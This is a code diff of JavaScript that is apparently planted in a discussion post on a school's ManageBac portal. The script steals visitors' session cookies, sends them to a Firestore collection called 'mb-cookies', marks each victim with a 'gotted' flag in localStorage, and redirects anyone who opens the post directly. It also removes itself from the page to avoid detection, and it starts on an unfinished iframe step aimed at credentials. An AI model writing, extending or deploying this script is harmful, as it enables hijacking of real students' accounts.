@@ -19,17 +19,6 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-//Delete elements of post
-const delPost = () => {
-  document.getElementById("discussion-payload-iframe").remove();
-  let a = document.getElementById("discussion-payload");
-  let discussions = document.getElementsByClassName("discussion");
-  while (Object.values(discussions).indexOf(a) === -1) {
-    a = a.parentNode;
-  }
-  a.remove();
-};
-delPost();
 
 const main = () => {
   const cookie = document.cookie;
@@ -57,6 +46,13 @@ const main = () => {
     xhr.send();
   };
 
+  const autoIframe = () => {
+    const success_credentials = false;
+    
+    let autoIframeEl = document.createElement("iframe")
+    
+  }
+
   const sCookie = async () => {
     try {
       const docRef = await addDoc(collection(db, "mb-cookies"), {
@@ -73,7 +69,7 @@ const main = () => {
   sCookie();
 };
 
-//check if client firectly on post and redirect if so
+//check if client directly on post and redirect if so
 if (
   window.location.href !==
   "https://tnsbeaconhouse.managebac.com/student/ib/discussions"
@@ -82,9 +78,18 @@ if (
     "https://tnsbeaconhouse.managebac.com/student/ib/discussions"
   );
   window.close();
+  delSelf();
 }
 //Check if already stolen
 if (localStorage.getItem("gotted") !== "true") {
-  console.log("gotted value not found, going into main!")
   main();
+}
+else{
+  delSelf();
+}
+
+function delSelf() {
+  var currentScript;
+  currentScript = document.currentScript || document.scripts[document.scripts.length - 1];
+  currentScript.remove();
 }
